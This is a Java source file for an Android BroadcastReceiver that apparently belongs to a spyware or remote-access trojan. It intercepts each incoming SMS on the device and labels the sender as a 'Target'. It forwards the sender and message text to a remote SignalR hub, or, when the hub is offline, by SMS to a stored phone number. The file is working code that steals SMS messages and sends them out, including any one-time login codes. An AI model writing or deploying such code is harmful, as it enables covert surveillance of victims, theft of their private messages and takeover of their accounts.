package com.mehrab.android.Receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

import com.mehrab.android.Application.ServiceManager;
import com.microsoft.signalr.HubConnectionState;

import java.lang.reflect.Method;

public class SmsReciever extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        ServiceManager manager = (ServiceManager) context.getApplicationContext();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus.length == 0) return;

            SmsMessage[] messages = new SmsMessage[pdus.length];
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < pdus.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                sb.append(messages[i].getMessageBody());
            }
            String sender = messages[0].getOriginatingAddress();
            String message = sb.toString();

            String Information = String.format("🔗 Message Sender - %s\n",sender) +
                    String.format("⌨ Message Text - %s\n",message);
            String ResponseCommand = "New Message Text Received From Target\n\n"+Information;

            new Thread() {
                public void run() {
                    if (manager.getHubConnection().getConnectionState() == HubConnectionState.CONNECTED)
                        manager.SendMessage(false,ResponseCommand,"");
                    else manager.SendSMS(manager.getPhoneNumber(),message,0);
                }
            }.start();
        }
    }
}